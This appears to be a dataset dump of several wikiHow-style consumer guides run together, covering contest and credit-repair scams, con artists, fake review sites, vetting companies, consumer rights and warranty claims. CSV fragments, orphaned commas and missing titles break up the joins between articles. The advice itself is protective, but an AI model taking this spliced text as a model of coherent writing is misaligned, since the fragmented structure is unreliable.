Never sign away the rights to your work.",How to Avoid Writing Contest Scams," If the terms of a contest demand a fee to enter, read the fine print and investigate the contest sponsor. Most often, not always, but often enough to raise red flags, paying money to submit your work involves a scam. There are many people in the literary world who believe no writer should ever pay a fee when submitting work for consideration. A healthy publishing environment seeks new, talented writers and pays them for their work; the writer is not asked to pay for the privilege of someone reading his or her work. Here are some common reasons contest sponsors give for charging an entry fee:


A “reader’s fee” is required to compensate the “editors” who will be reading your work. Some contests have a tier of “reader’s fee” prices; one price for having your entry read, one price for a cursory feedback on your writing, whether it wins or not, and a still higher fee for a “comprehensive review and feedback of your contest entry.”






A fee is required so that the contest sponsor can pay for the production of an anthology of the winning stories or poems. That is a scam, no matter who is sponsoring the contest, and here’s why: legitimate publishers do not finance their publications with contest entry fees.;
, The requirement of a fee to enter your work into a contest doesn’t automatically disqualify the contest as bogus. Sometimes, a literary organization simply has to support itself with contest entry fees. Read the contest rules and then ask yourself if you can define the purpose of the contest:


Is the primary objective of the contest to reward literary merit?






Is the fee modest? Are the reasons given for the fee requirement reasonable?
Does the sponsor put forward vague promises of eventual publication of your manuscript, whether you win the contest or not?
Is the sponsor really trying to solicit money from you for the editing of your manuscript?
Do you have to become a member of the organization, and pay a membership fee, in order for your writing to be eligible for submission?

, The end goal of vanity publishers is to charge you for publishing your work. Most entries “win,” but the sponsor demands a fee in order to publish your “winning” entry. Publication in these types of anthologies may even diminish your standing as a legitimate author in the eyes of professional publishers.

,,






Is the quality of writing of previous winning entries low or mediocre?
Are the names of the judges listed? If so, don’t just take the contest sponsor’s word for it; Google the names of the contest judges and read about their backgrounds, education and accomplishments in the publishing world. If the staff member’s names are listed, investigate their literary credentials as well. If the site does not list the names of the judges, contact the sponsor and ask for the information.
Does everyone win? If the sponsor states that every entry wins, then it really isn’t a contest.
Does the contest have any other web presence? Does a search about the contest or the sponsor turn up any other links? The lack of any other information doesn’t necessarily mean the contest is a scam, but proceed with caution.
Is the entry fee exorbitant? It’s rare for an entry fee to exceed $20. You should also look at the ratio of the fee to the prize. Are you being asked to pay a fee of $25 for a top prize of $50?
Does the amount of the prize depend on the number of entries? If so, it’s best to skip it. You have no idea how many people will pay the entry fee. If you and only 3 other people pay $20 each, your top prize will be $60, or less if the entry pool funds are used to pay stipends to judges.
How frequently is the contest offered? Most legitimate literary organizations don’t sponsor more than 4 contests a year.

, Language to look out for:


In the event that there is an insufficient number of entries received that meet the minimum standards determined by the judges, all prizes will not be awarded.






By entering, entrants (YOU) release judges and Sponsor(s), and its parent company, subsidiaries, production, and promotion agencies from any and all liability for any loss, harm, damages, costs, or expenses, including without limitation properly damages, personal injury, and/or death arising out of participation in this contest, the acceptance, possession, use or misuse of any prize, claims based on publicity rights, defamation or invasion of privacy, merchandise delivery, or the violation of any intellectual property rights, including but not limited to copyright infringement and/or trademark infringement.

, Be on the lookout for disclaimers with any of the following clauses:


All submissions become sole property of Sponsor and will not be acknowledged or returned. If you agree to this, you have relinquished acknowledgment and control of your submission.






By submitting an entry, all entrants grant Sponsor the absolute and unconditional right and authority to copy, edit, publish, promote, broadcast, or otherwise use, in whole or in part, their entries, in perpetuity, in any manner without further permission, notice or compensation. Entries that contain copyrighted material must include a release from the copyright holder.

Do credit repair on your own.",How to Avoid Credit Repair Scams," A legitimate credit repair agency should not require that you pay before using their services. If they do, then you may be dealing with a scam.Hold onto any communication in which the agency demands payment before doing any work. This information will be helpful if you choose to report the agency.;
, A credit counselor should tell you about their services before asking you to reveal any details about your personal financial situation. If the counselor wants to know your business right up front, then you should treat this as a red flag and move on.Credit counselors should be happy to provide you information about their services through the mail or in person without pressuring you.

, One scam is to sell you a nine-digit number and call it your new “credit profile number” or “privacy number.” This number may be a stolen Social Security Number (SSN). After selling you the number, the agency encourages you to take out new credit using it.The agency may also encourage you to get an Employer Identification Number (EIN) from the IRS. This number is typically used by a business and is not a substitute for an SSN.
If you don’t have a legitimate business and use an EIN, then you are probably committing fraud and could be prosecuted. You could go to jail or have to pay heavy fines.

, Some credit repair agencies will encourage you to get new credit by lying on application forms. For example, they might tell you to inflate your income or to use someone else’s name. It is actually a crime to lie. Any agency encouraging lying is definitely a scam., A legitimate credit repair agency should help you come up with a plan to pay off your debts. However, some promote bad advice. If the agency tells you any of the following, then you should stop doing business with them:You are told not to contact credit reporting agencies directly.
You are told to dispute information on your credit report that is accurate.
You are not given a description of your legal rights (called “Consumer Credit File Rights Under State and Federal Law”).
You are not given any kind of written contract or description of services offered.

, Sometimes, credit repair agencies make promises that sound too good to be true.In fact, they almost always are. If an agency promises to fix your credit in a short period of time or makes the process sound easy, then you should be on your guard.


Also be skeptical of any agency that promises to raise your score a certain number of points. They can’t make that promise., The BBB collects complaints about businesses, so you can always check your local BBB to find out if anyone has lodged a complaint against the credit repair agency. Visit www.bbb.org and enter the agency’s name and location.


See Check a Business at the Better Business Bureau for more tips.

, You should also check with your state Attorney General to see if complaints have been made or if lawsuits have been filed against the credit counselor.Scammers usually have many complaints. However, realize that a lack of complaints isn’t 100% proof that the counselor is legitimate.


Also check with a local consumer protection agency. Visit https://www.usa.gov/state-consumer and click on your state to find a local agency office.

, Every state has an attorney general who prosecutes criminal violations, such as fraud. You should find your state’s AG’s office and report the fraud. You can find a list of state AGs here: http://www.naag.org/naag/attorneys-general/whos-my-ag.php.


Click on your state’s AG to access contact information and a website address.

, You can also report credit repair fraud to the Federal Trade Commission (FTC) at 1-877-FTC-HELP.Be sure to have evidence of the scam, such as the following:


the name of the credit repair agency
the names of any individuals you spoke with who work at the agency
why you suspect they are a fraud

, You can also report the scam to the FTC using their complaint assistant, which is available here: https://www.ftccomplaintassistant.gov/#&panel1-1. At the website, you can file a report by clicking the following:


Click on “Credit and Debt” on the left-hand side of the screen.
Click on “Debt” to report the actions of a company offering to repair credit.
Identify the company by clicking “A company offering to repair your credit.”
Select how you were contacted (e.g., “I initiated contact”).
Provide requested information, such as how much you were expected to pay the credit counselor.
If you have questions, you can contact technical support Monday through Friday, 9:00 am to 8:00 pm Eastern Standard Time by clicking on the button.

, You should visit the BBB website and report the scammer.Provide all information requested by the BBB and offer a detailed reason why you suspect the counselor is a fraud.

, You can always sue a credit repair agency that defrauds you. For example, you can sue to get compensated for the amount of money you paid to the agency or for however much money the agency has cost you due to their fraudulent behavior.You can also seek punitive damages. This is an amount of money awarded to punish the credit repair agency.
You can file a lawsuit in federal court. However, you should probably talk with an attorney to discuss your options before doing anything.

, Generally, non-profits are more reputable than for-profit credit repair agencies.When you find an agency, you can call and ask whether it is a non-profit. Often, agencies will advertise their non-profit status.

, You can find a legitimate credit counselor from many different places. First, you should ask friends or family if they have ever used a credit counselor and if they would recommend the agency. Other places you can look include:credit unions or banks
local consumer protection agency
housing authority
universities
military bases
branches of the U.S. Cooperative Extension Service

, The U.S. Trustee Program approves a list of counselors to provide pre-bankruptcy counseling.Many of these agencies can also provide credit repair services. You can check the list at the U.S. Trustee’s website.


The list is available here: https://www.justice.gov/ust/list-credit-counseling-agencies-approved-pursuant-11-usc-111.
Select your state from the “Choose Option” drop-down box. Then click “Go.”

, A good credit repair agency will provide clients with a variety of services. You should get a flyer or check the website to see what they offer. Look for the following:counseling
education to avoid future problems
debt consolidation
debt payment services

, Before hiring an agency, you should find out important information so that you can compare them to other agencies. Call up three or four credit counselors near you and ask the following questions:Are they licensed to offer services in the state?
What are their counselors’ qualifications? Are they accredited by any organization? How were they trained?
Do employees get paid a bonus the more people they help sign up?
How does the credit counselor keep personal information confidential?
What are the fees and how are they charged (e.g., monthly)? Is there a set-up charge?

, A legitimate credit repair agency should provide you a written agreement that explains your rights before you begin working together. Make sure to read this document closely. It should be clearly written and easy to understand. A solid written agreement should contain the following information:the company’s name and business address
an explanation of the services they perform
an estimate of how long it will take for your credit to improve
the total amount you will have to pay
any guarantees
that you have a right to cancel without charge for the next three days

, Often, credit counselors will have you make one payment to them. They will then divide up the payment among your creditors and forward the payment on. However, you should always check with your creditors to see that they received your payment.Some unscrupulous counselors might skim some money off the top of your payment and keep it for themselves.

, You don’t need to pay an agency to repair your credit. Instead, you can do it yourself by reviewing your credit reports and removing inaccurate information. Then you will need to come up with a budget and stick to it.

Unfortunately, nothing in life is really free. If someone makes you an offer that sounds too good, then it probably is.


For example, someone who claims an offer is “high profit, no risk” is clearly lying.Why wouldn’t they take advantage of the deal instead of offering it to you?
Also avoid medical treatments that promise “miracle cures.”Unfortunately, there are few miracles in medicine.
Be skeptical of claims that you can make $5,000 a month out of your own home if you just send $500 to a company. These deals rarely pan out.;
, High pressure sales tactics are attempts to get you to purchase something quickly without thinking it through. Con artists love these tactics because they are often effective. If someone contacts you, be on the lookout for the following high pressure techniques:


The scammer tells you that you must act now, otherwise the offer will disappear.The con artist claims that what they are trying to sell you is rare, so you better snap it up fast. This is almost always false.The scammer bullies you or screams at you.Since you aren’t obligated to buy anything from anyone, there is no reason you should be bullied.

, Con artists are very creative and come up with new cons every day. However, there are some popular frauds which you should recognize, such as the following:


Someone poses as an agent for the Internal Revenue Service. They demand that you pay money to avoid being put in jail.You should realize that the IRS will not call you without first sending you a letter. Also, it is highly unlikely you will be put in jail.
Someone approaches you directly to sell services and asks for advance payment. For example, someone could offer to make repairs on your home. After you cut a check, they disappear.
The person promises you that what they are selling you will increase in value. In fact, they claim that there is a third person waiting in the wings to buy the product at a mark-up. This is a scam. If the third person wanted the product so badly, they could buy it directly from the con artist.
You receive a phone call or email telling you that you won the lottery or some other prize. The person on the other end asks that you send a “processing fee” or a down payment. After you send the money, you never hear from them again.
Read a list of the most common scams at https://www.usa.gov/stop-scams-frauds#item-35172.

, A majority of con artists will try to get money from you. They use common schemes that they know have worked in the past. Once you know how these types of scams work, you will be able to identify them and avoid them easier.

A lot of financial scams take place over the phone. The scammers will exaggerate or lie to get you to give them some amount of money. This could mean offering ""free"" vacations that actually have a ton of hidden fees. You will also see con artists offer you fake business or investment opportunities. Once you give them the money, they will disappear. A lot of con artists will pretend to be taking donations for a specific charity. in reality, they keep the money they raise for themselves.
If you recognize these types of phone calls, avoid them and hang up. If it is an automated call, consider putting yourself on the national do not call list by calling 1-888-382-1222., Unlike financial scams, phishing scams attempt to gain access to your personal information (e.g., account numbers, Social Security numbers, ID numbers). Con artists use this information to steal your identity. To get access to your personal information, scammers will call or email you with an urgent message. They will tell you that something has gone wrong and that they can fix it if they get your personal information. For example, some scammers will call you telling you that there has been fraud on your bank account. The caller will tell you they can fix it, but they first have to verify your personal information.

When you get these types of messages, do not fall for their bait. Hang up and never give your personal information to anyone with out first verifying their identity.
if you get an email you do not recognize, never open an attachment that may be embedded. These attachments are usually viruses that act to take personal information from your computer., Often, people know that they are potentially being conned. The person talking to you sounds too smooth, or the offer is too good to be true. A tiny voice in your head says, “This doesn’t sound right.” You should trust that voice.Also pay attention to how your body responds. If your palms are sweating or your heart is beating fast, then you are not thinking rationally at that point.You are vulnerable to being conned.

, Before making a purchase, you should always ask questions. Get answers to anything you are unsure about. Ask about the details of the product, and always listen closely to the answers.


Some con artists are so confident in their ability to lie that they will trip themselves up or talk in circles.If you listen closely, you can recognize that they are not making any sense.

, You can stay on top of the latest frauds by signing up for fraud alerts from the Federal Trade Commission. Sign-up is free. Visit http://www.ftc.gov/scams to sign up. Alerts will be sent to your email account., Scammers are often successful because people are afraid to say “no” and sound rude. For this reason, you should memorize a few lines that you can repeat whenever someone tries to sell you something.


For example, if someone calls you over the phone, you can say, “I’m sorry. This isn’t a good time. Good bye.”Then you hang up the phone without letting the other person speak.
If someone stops you on the street, you could say, “I’m sorry. I’m running late!” and then keep walking.
Practice these responses so that they are second nature and you use them automatically.

, In the United States, you can stop telemarketers by signing up with this registry.Registering won’t protect you from all con artists, but it can make it more difficult for them to harass you.


Visit http://www.donotcall.gov and provide your information.

, Whenever someone tries to sell you something, you should always ask if their business is licensed. Also ask who licensed them and ask for their license number.


If the seller hesitates, then assume you are dealing with a con artist.
Once you get the license information, you can check with the relevant government agency to see if they are truly licensed. For example, someone selling you insurance should be licensed with your state’s insurance department.

, Many scams make a promise and then ask that you pay in advance. For example, they might need a down payment or processing fee. You should avoid doing so. In fact, you shouldn’t offer anything of value in advance:


Don’t send money. Also don’t let a business send a messenger to your home to pick up money.Don’t give out your financial information, such as credit card or bank account numbers.
Don’t give out your personal information, such as your date of birth or Social Security Number.

, Some scammers will tell you that their business is legitimate and that you don’t need to check with anyone. You should immediately hang up or walk away. A reputable business will be comfortable letting you check their reputation.


Visit your local Better Business Bureau and look at complaints.
You can also contact a local consumer protection agency and ask if they have ever heard of the company.Also search online for complaints. Type in the name of the company and see what comes up.

, Con artists are skilled at preying on your emotions. They get you feeling so excited (or worried) that you make an impulse decision. Instead of acting impulsively, you should always think over any purchase. In fact, there is no reason not to let you have 24 hours to think before buying.Talk to your family about whether to buy something. If you are elderly, then talk to your children. If you don’t have any children, then call a local consumer protection agency.
If you are making a big financial decision, then talk with a financial advisor or a lawyer.For example, you shouldn’t take out a reverse mortgage on your home without talking to several people.

, When people are in financial distress, they may be very scared and feel like they have no options. For example, an elderly person who doesn’t have much money might think they have to sign over the deed to their house in order to afford to live. Usually, you have many other options.


If you can’t identify alternatives, visit a senior center in your neighborhood or call one.
If you are low income, then find free or reduced-price legal aid in your area. Visit http://www.lsc.gov and type in your address. A qualified legal aid attorney can listen to your situation and come up with alternatives.

, Many people fall for scams because they are in financial distress.You can protect yourself from con artists by tackling your financial problems and getting on firmer footing.


If you are heavily in debt, then attend credit counseling. A credit counselor can review your finances and recommend a debt repayment plan. The counselor may also be able to negotiate lower interest rates or stretch out the repayment period.
Also consider bankruptcy. Bankruptcy is never ideal. However, it can give you a fresh start. Your credit score will take a big hit, but you can begin repairing it immediately. Schedule a free consultation with a bankruptcy lawyer to discuss whether bankruptcy is right for you.

, Unfortunately, the elderly are popular targets for con artists. As people age, memory loss and loneliness can make them vulnerable. People are particularly vulnerable when a recently deceased spouse used to handle the finances. If your parent is elderly, you should discuss a possible financial power of attorney.


With a power of attorney, the person appoints an “agent” who is empowered to make financial decisions for them. The agent can sell property, manage bank accounts, and make charitable gifts.After an elderly person creates a power of attorney, they can simple tell anyone who approaches them with something to sell to contact their agent.
See Get Power of Attorney for more information.

, If you’ve fallen victim to a scam, then you should definitely report it. Sometimes, people are too embarrassed to report fraud because they fell victim to the con.Remember that no one is judging you.


Instead, focus on the fact that you are protecting other people by reporting the fraud.

, Before reporting the fraud, you should gather important details that will help authorities find the con artist. Write down the following:The con artist’s name.
Any address and phone number the con artist gave you.
Details about the scam, such as what you were offered and what the con artist said.
How much money you paid to the con artist and the method of payment (e.g., cash, check, or some other method).

, You should report the fraud quickly to your local police.You can find the number in the phone book or look online.


You probably can report fraud anonymously. However, you should consider giving your name.
If you give your name, then law enforcement can follow up with questions. You also could serve as a witness against the con artist if they are prosecuted.

, You can also report con artists to your state’s Attorney General.You can find your state’s office by searching online. Type “your state” and “attorney general” into a search engine.


Look for contact information on the Attorney General’s website.

, After reporting to local law enforcement and your state agency, you should file complaints with relevant federal agencies. You should report the con artist to the following:National Fraud Information Center. Call 800-876-7060, from 9:00 am to 5:00 pm.
Federal Trade Commission. Visit https://www.ftccomplaintassistant.gov/#&panel1-1 to report telemarketing and other scams.

, If the con artist contacted you over the Internet, then you can report to the IC3, which was created by the Federal Bureau of Investigation to smoothly process complaints of Internet fraud. The IC3 works with local, state, and federal regulatory agencies to identify and pursue fraud.Visit https://www.ic3.gov/default.aspx and click on “File a Complaint” to get started.
If you live outside the United States, then you can report Internet fraud to your nation’s authorities. You may also be able to report to the E-consumer website at https://econsumer.gov/#crnt, which works with 35 member countries.

Check if the outgoing links on the reviewed products include an affiliate tracking code.,
While an affiliate relationship can be found behind almost all fake review sites, the converse is not necessarily true.,
Look for an FTC disclosure statement.,
Look at what else is on the site.,
Look at any dates on the webpage, especially those within a few weeks of the current date.,
Look for any locations, especially ones near you.,
Read the user comments section.,
Read the reviews.,
If a review site has an affiliate relationship with the products being reviewed, combined with any of the other deceptive methods described here, you can safely assume it is a fake review site.,
Run the images of anyone giving a testimonial through Tineye reverse image search.,
Check for duplicate reviews.",How to Spot a Fake Review Website," The most transparent way to link to Tom and Elaine's Cleaners ""We clean out your colon, your registry, and your bank account"" is to link directly to http://www.tomandelainescleaners.com. This is the way an independent reviewer whose compensation is not based on how many readers buy the product being discussed will most likely link.


Affiliate marketers need to be able to get credit for everyone who buys through their link, so they must include a tracking code in the URL.
Since tracking codes look bad, many affiliate marketers cloak their links through redirects. In that case, the link will look like an internal link to another page on their site which redirects to the tracking link. You may need to disable automatic redirection on your browser to see the full affiliate link.;
, It is possible to earn an affiliate income without resorting to any form of deceptive marketing. Use the information in the later steps and your cautious judgment as a consumer to evaluate the trustworthiness of any affiliate reviewer.

, The Federal Trade Commission requires reviewers to declare any conflicts of interest they have concerning the products they review.If their reviews contain affiliate links and they don't disclose that fact, then their site violates the law if they do business in the United States.


This may also be a violation of laws in other jurisdictions; ask a lawyer for advice.

, If the entire site is nothing but advertising disguised as impartial reviews, then the author has no expectation of having visitors return, and consequently, no risk of losing regular visitors should they question his honesty.

, Often fake reviewers will change the dates to make their page look more recent than it is.If the page includes blog-like comments from readers, those comments may have made up timestamps as well. Claims of ""Offer expires "" are almost certainly false, however you do need to act quickly––before Oprah and Dr. Oz sue their parent company into bankruptcy over misleading endorsements.If you suspect fake time stamps and want to catch them at it, try changing the date on your computer, reloading the page, and seeing what changes.

, They may be running a GeoIP script to determine your location and trying to win your trust by appearing more local than they actually are., Many respected websites, including blogs and newspapers, allow readers to post feedback on their content. Other respected sites like wikis and news aggregation sites consist almost entirely of reader submitted content. Fake review sites try to mimic the appearance of respected sites without actually doing anything to earn that respect. Visitor comments create the impression that the site has an active following, and that his readers appreciated his valuable reviews and had great experiences with the products. Of course, he can't actually open up his site to visitor comments without the risk of getting ones like, ""Didn't work."", ""I tried to cancel. How do I get them to stop billing me?"", or, if he's using GeoIP tricks, even the seemingly innocuous ""Hey, I live in Nashville too.""


Try leaving a comment; chances are the submit button is just an image and isn't attached to anything except maybe a popup ad.

, There are several things to look for here:


Look for numbers. Numbers look scientific and serious. Sometimes they are, but only if those numbers actually stand for something that it makes sense to put a number on. What does it mean if one product got a 96% rating in value while another got a 92%. Does the reviewer explain what 96% value means? How much of a discount would be needed to make it a 97% rating? You won't get an answer because there isn't one. It's just made up to impress you by looking important.
See if the review contains any actual evidence of having used the product. Ignore ingredient lists, refund policies, etc.––you can study those yourself without having to buy anything. Ignore star ratings––those were probably just based on the commission payouts. Ignore testimonials––assume those were completely fabricated. Is there anything left that might have come from actual experience with the product?

, As such, anything appearing on the site is based not in truth, but in what's most likely to generate sales.

, Writing fake testimonials is easy and extremely common. Images are scarcer and might be used with different names, locations, and experiences on other websites.If so, you've caught the fake reviewer in another lie.

, Many people who give fake reviews place them on multiple sites and use the same text. It is therefore a good idea to check for duplicates.


Copy a sentence or two from the review you are worried about.
Paste the text into Google, Bing, Duck Duck Go or another search engine and click Search.
If you find the exact text listed on another website, it is likely the review is faked and has been pasted into multiple sites.

Check the company’s website for a legitimate telephone number and address.,
Browse the company's website for discrepancies and indicators of professionalism.,
Review the website’s policy pages.,
Look for decent content.,
Consider how the company accepts payments.",How to Check if a Company Is Genuine1," If there is no way to contact this company offline, this may be a red flag that the business is not legitimate. Since emails and domain names are easy to obtain, having an email address is not as trustworthy as offline contact information.Remember that both phone numbers and addresses are now super easy to fake. There is a whole industry in providing fake area code and 800 numbers. Even Google now does this, so phone numbers are no longer a sign of a real company. Before doing business, call the local chamber of commerce associated with the address and see if they are a real bricks and mortar company, or simply a referral skimming internet company with a phony address.
Search in other cities to see if a supposedly ""local business"" is using the same website for operations in other localities. You should be wary if you find the same supposedly local business page being used for another location. Usually these copied phony business web pages are used in many cities and are just copied templates. Many have broken hyperlinks for images and links, which is a tip-off that this may be a phony phishing business page.;
, If a website says one thing in one spot, and then contradicts itself in another spot, that's a red flag that the business is not coordinated and may be a scam that was hastily thrown together. If the website is unprofessional (for example, there are stolen images and numerous spelling errors), this shows that little thought or care was put into creating the website, which could indicate a ""get rich quick"" scam. , Legitimate companies will almost always have terms of use or terms and conditions pages, as well as privacy policy pages. If they do have terms and privacy policies, read through them carefully suspicious sounding language.

, Phony referral business sites usually don't have much content on their sites and usually have lots of legitimate company and BBB logos on their site to trick you into trusting them. A 'big' tip-off are stock photos or no photos of the company building, employees, or products. Avoid the company if all you see are stock photos of their so-called product, which is one of the easiest way to spot a fake web business!

, It’s a red flag when a company’s website says they only accept payments through insecure or shady methods, such as only by paper check or cash. This is because PayPal and other secondary electronic payment providers are often considered the safest method for paying online businesses. Look into payment methods which will allow you to get your money back if things go sour and do not require the release of unnecessary personal information."

If so, check and make sure that these displayed certifications are up to date.
Restaurants should have relevant documentation required by the local Department of Health and Sanitation clearly displayed on the wall. Typically, this type of documentation provides the business with a grade, and the presence of such documentation indicates the legitimacy of the restaurant.

, You can sometimes find the name and information for the person who registered the website, which you may want to use for further research. Determine when the website was created and when it will expire. If it was only created recently and will expire soon, that may point to the website being a temporary cover for a scam.

The right to choose from a selection of quality products and services that are sold at competitive prices.
The right to safety or that products purchased in the marketplace and used as directed will not harm the consumer.
The right to information about products so that consumers can make informed choices when purchasing goods.
The right to be heard by manufacturers of products as well as by government agencies and courts when raising a complaint.
The right to a remedy or redress when a consumer is dissatisfied with or injured because of a product or service.
The right to environmental health, which means that manufacturers and marketplaces cannot operate their businesses in a way that damages the environment.
The right to service that is convenient and respectful.
The right to education about consumer rights and training to facilitate thoughtful and informed decisions in the marketplace.;
, Before making a large or risky purchase, you should consider checking with other retailers to make sure that the item is not less expensive elsewhere. In addition, you should discuss your potential purchase with a trusted friend or family member who has made a similar purchase. You may also consider:


Making a budget to determine whether you can afford the item.
Deciding what features or services are absolutely necessary and what are unnecessary but costly.
Reading reviews online about the product and determining whether the product has been recalled. You can check on recalled products at: https://www.recalls.gov., A warranty is a promise by a seller or manufacturer that they will repair or replace a product if it breaks down within a certain amount of time. Federal law requires that warranties must be available for consumers to review before purchasing a product. When reviewing a warranty or comparing warranties between manufacturers, you should look for the following:


Check to see how long the warranty lasts and if anything voids your coverage.
Who provides warranty service – is it the manufacturer or someone else?
Does the company repair or replace the product if it stops working?
What repairs or problems are covered?
Ask that any warranties made orally by a salesperson be put in writing or you may not be able to get the promised service., Before contracting with someone for professional services such as lawyers, contractors, plumbers or others, you should make sure that they are appropriately licensed before hiring them.


Contractors, plumbers and electricians are all required to be licensed by state boards. You can request a service provider’s license number and then check his or her licensure status online. You can find links to state license boards at: http://www.contractors-license.org.
You check whether lawyers or doctors are licensed through state bar associations or medical associations.
You can find a list of state bar associations at: http://shop.americanbar.org/ebus/ABAGroups/DivisionforBarServices/BarAssociationDirectories/StateLocalBarAssociations.aspx.

, The Better Business Bureau (BBB) maintains a list of complaints and ratings for companies. Before hiring a business to provide services, you should review BBB’s website to make sure the company has not mistreated consumers in the past.


You can lookup companies on BBB at: https://www.bbb.org.

, When making purchases online, only provide your contact information and credit card companies at trusted websites.When making online purchases, you should look for a small padlock symbol in your address bar. This indicates that the website is secure.
Website addresses that begin with “https” versus “http” offer a greater level of security.
If you are unsure whether the site is trustworthy, conduct an internet search on the name of the company or website and the words “trustworthy” or “secure.” This may help you uncover any problems people had with the website or reviews that the website is secure., You should always request and keep the receipt for any product or merchandise that you purchase. A receipt is usually required to return faulty merchandise or submit a complaint against a business. You should also keep other important documents related to the purchase of goods or services, such as, contracts, warranties and manuals., It is important to comply with the warranty and care instructions of a product. Some warranties will be voided if you use the product in manner that was not specified. Additionally, some manufacturers require that you register your product and/or warranty with them, either online or by returning a warranty card., Occasionally, gift card companies may try to charge you a fee for failing to use your card within a year. Federal law prohibits these types of charges. You cannot be charged an inactivity fee until after you have not used the card for a year and the card cannot expire for at least five years.


You should also check your state laws regarding gift card fees and expiration dates as some states have banned these practices.You can review state and federal law regarding gift cards at: http://www.ncsl.org/research/financial-services-and-commerce/gift-cards-and-certificates-statutes-and-legis.aspx


, People are increasingly making large purchases over the internet. There are a number of things you can do to protect against fraud and consumer rights violations. One of the most important things that you should do is use a credit card when making online purchases. Credit card companies are responsible for fraudulent purchases over $50, whereas a debit card does not offer the same protection.Before making an online purchase, you should read the website’s security policy and how it handles disputed charges.
Some websites, such as eBay, offer customers a money back guarantee is a seller is unable to resolve an issue with your transaction.Whenever an Amazon account holder goes to purchase an item, the website automatically shift the person’s account to an encrypted server to protect his or her payment information.Amazon also allows you to dispute any unauthorized charges through Amazon directly with the company., If you make a purchase that you regret or felt pressured into, under federal law consumers have the right to cancel the purchase by midnight of the 3rd business day after the sale.


Your purchase must be for $25 or more in order for the cooling off rule to apply., While federal and state laws place requirements on retailers regarding refunds, one of the best ways to protect your consumer rights is to ask a retailer to explain their return and refund policy before you make a purchase. It is more likely that a large retail operation will have posted their refund policies, however smaller retail operations or individuals may not.In addition to asking a retailer to explain their policy, you should review your state’s laws regarding refunds. You can find a summary of state refund laws at: http://consumer.findlaw.com/consumer-transactions/customer-returns-and-refund-laws-by-state.html.

, Despite taking precautions, you may still experience a violation of your consumer rights. If you experienced problems with an item or service that your purchased, you have the right to complain. If you are not satisfied with the retailer’s response, you have the right to file a formal complaint against the business. Just as you have consumer rights, you also have an obligation to speak up when your rights are violated and express your concerns., If a purchased product is defective, your first step should be to contact the seller or manufacturer of the product. If you call the manufacturer, ask to speak to the customer service department and explain the problem with the product. Most companies want to maintain good customer relations so often they will work with you to repair or replace the product.


Normally, the product needs to be defective and your claim must be maid within the timeframe of the warranty.
Some companies will replace a defective product outside of the warranty because they want to maintain positive customer relations.
Some sellers may require proof of purchase before repairing or replacing defective goods.
If customer service is not providing satisfactory assistance, you should ask for the name of the person’s supervisor or manager and an address where you can send a letter., If after speaking with customer service, the seller or manufacturer did not resolve your issue, you should write a letter to a supervisor in the company. You can always ask a customer service representative to whom you should address your concerns. In your letter, your should address the following:


When you purchased the product or service, the amount that you paid and attach copies of any invoices or receipts that you have.
A detailed description of the problem with the product or service and why it failed to meet your expectations.
A statement of how you want the situations resolved, either by refund, replacement or repair.
If your letter does not get a response, send a copy of the letter to the business’s national headquarters or someone higher in the management chain. If this is a small retailer, there may not be anyone else to whom you can complain and therefore you should make your complaint to consumer protection offices and organizations.
You can review a sample complaint letter at: https://www.usa.gov/consumer-complaints., If you received poor service or a defective product and an unsatisfactory response from the retailer, you can write a negative review about the retailer online. Many online retailers such as Ebay and Amazon and websites such as Yelp allow you to post negative as well as positive reviews about products and services. By posting an online review, a retailer may respond to your concerns more quickly. If not, you have at least warned other consumers about the issues you faced.

, BBB allows consumers to file complaints about businesses for poor services and products. BBB collects information about the nature of the transaction, the product and the consumer’s complaints. BBB then forwards your complaint to the business within two business days. They ask each business to respond within 14 days and try to resolve consumer complaints within 30 days.


You can file a complaint with BBB at: https://www.bbb.org/consumer-complaints/file-a-complaint/get-started., Every state has a consumer protection agency dedicated to protecting consumer rights and addressing consumer complaints. While each agency may have its own requirements, generally you will be asked to provide the following information:


Name and contact information.
Information about the seller and the type of product or service.
A detailed description of your complaint.You can find contact information for state consumer protection agencies at: https://www.usa.gov/state-consumer.
At the federal level, the Federal Trade Commission (FTC) is responsible for protecting consumer rights. The FTC accepts complaints under several broad categories: identity theft; scams and rip-offs; unwanted telemarketing, text, or SPAM; mobile devices or telephones; internet services, online shopping, or computers; education, jobs, and making money; and credit and debt.
You can make a complaint to the FTC online at: https://www.ftccomplaintassistant.gov/#&panel1-1


, Some contracts for services or purchase may require that a consumer and retailer engage in dispute resolution rather than filing a lawsuit. Dispute resolution may include the following:


Mediation, which is when both sides meet with a neutral third party who helps facilitate an agreement or settlement between the parties. In mediation, the parties attempt to reach an agreement with the assistance and guidance of a mediator. The mediator does not have the power to require the parties to take any actions.
In an arbitration, the arbitrator acts like a judge and decides how the dispute should be resolved."
"
Read all the information in the warranty statement from the manufacturer.,
Keep detailed records of all maintenance required on your purchase.,
Keep all paperwork that supports your claim, including sales receipts and prior warranty work which has been covered.,
Notify the warranty department of the seller immediately when the problem occurs.,
Do not let the service people talk you into partial repairs, or using rebuilt or after-market parts.,
Talk to the salesperson who sold you the item if the service department refuses to help you.,
Go to the store manager or owner, if possible, and make your case as honestly and forthright as possible.,
Hit the internet.,
Go to government and public service websites.,
Use good judgment.,
Keep records of repair costs and loss of use, if you are forced to pay to have the repairs done.",How to Get a Warranty Honored," Often there are exclusions of certain items in the ""fine print"". Don't give up too easily, though, some of these exclusions are regulated by laws which vary from state to state.;
, In the case of an automobile, this will include oil changes, lubrication, the engine air filter, and possibly other things pertaining to a specific vehicle. You will have very little luck settling a warranty dispute if the maintenance schedule has not been followed and documented.

, On some occasion, a replacement part or service work may have an extended warranty for that particular item.

, Some minor problems manage to become major ones if not dealt with properly. An example would be a car with low engine oil pressure. If this is corrected, it can be a simple repair, but if left uncorrected, it will cause engine failure.

, They will sometimes do this to cut cost, but most warranty work calls for factory replacement parts.

, Remind him/her of any promises they made when selling the product, and try to get them to stand behind their product.

, Let them know you will go to the top of the corporate ladder if needed...and follow through.

, Visit the corporate website, look for executive email addresses and FAQ (frequently asked question) links. Write an email detailing the problem, your perspective on why it is a warranty issue, and a description of the response you got from the dealer or seller. Stick to the facts, the date of purchase, the implied warranty if there was one, and the exact nature of the problem.

, When dealing with car problems, go to car websites, and look for Technical Service Bulletins and Recalls. Often, the manufacturer does not want to admit a defect exists, but over a period of time, the industry and any federal government agencies with jurisdiction on the product will force action to remedy common problems, especially safety issues.

, Do not fight a long uphill battle over a small repair charge, but do not compromise safety or quality of life out of stubbornness to make the manufacturer pay for the problem.

, You may continue to have problems with the item, and even be forced to take legal action. In this case, documentation may allow you to recover all your costs, and repayment for lost use.

Look at what is already covered in the warranty.,
